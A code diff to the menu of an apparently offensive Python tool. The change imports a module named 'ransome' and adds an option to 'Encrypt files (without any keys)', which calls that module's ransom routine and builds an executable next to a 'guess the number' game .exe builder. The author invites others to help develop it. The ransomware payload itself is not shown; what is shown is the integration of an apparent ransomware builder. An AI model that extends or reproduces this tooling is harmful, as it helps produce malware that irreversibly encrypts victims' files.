@@ -5,6 +5,7 @@ import shutil
 import sys
 import logo
 import guess
+import ransome
 
 # Display logo (Make sure you have a 'logo' module with the 'root()' function)
 logo.root()
@@ -13,21 +14,28 @@ os.system('cls' if os.name == 'nt' else 'clear')
 
 
 def main():
-    print("[1] Guess the number game (Windows version) and create .exe")
-    print("[2] Encrypt files (WIP)")
+    print(f" \033[1;34m[1] Guess the number game (Windows version) and create .exe")
     print("")
-
+    print(" [2] Encrypt files (without any keys)")
+    print("")
+    print(" [3] Encrypt files (with keys)")
+    print("")
     x = input("Please select your option: ")
 
     if x == "1":
         guess.create_exe()
         guess.one_option()
     elif x == "2":
-        print("File encryption feature is under development.")
+        ransome.rans()
+        ransome.create_exe()
+    elif x == "3":
+        print("")
+        print("Option [3] under development")
     else:
+        print("")
         print("Invalid option. Please try again.")
 
-
+    print("")
     print("[Note:]")
     print(f"\033[0;33mthe tool under development if you want to participate or help, contact me")
     print(f"here: https://www.x.com/@lose_sec")
